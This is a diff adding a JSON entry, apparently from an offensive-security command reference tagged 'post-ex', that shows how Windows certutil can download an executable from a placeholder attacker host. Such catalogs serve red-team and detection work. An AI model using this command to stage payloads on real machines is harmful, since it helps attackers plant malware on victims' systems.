@@ -1,0 +1,28 @@
+{
+  "id": "fb12bbe9-45e",
+  "name": "certutil - download files (Windows)",
+  "tool": "certutil",
+  "description": "Use certutil to download files from HTTP servers on Windows hosts.",
+  "tags": [
+    "certutil",
+    "post-ex"
+  ],
+  "ports": [
+    "80",
+    "443"
+  ],
+  "commands": [
+    {
+      "name": "Download executable with certutil",
+      "command": "certutil -urlcache -split -f http://{ATTACKER}/file.exe file.exe",
+      "description": "Fetch a file from an HTTP server using certutil.",
+      "ports": [
+        "80",
+        "443"
+      ]
+    }
+  ],
+  "created": "2025-09-23T00:00:00Z",
+  "modified": "2025-09-23T00:00:00Z",
+  "platform": "any"
+}
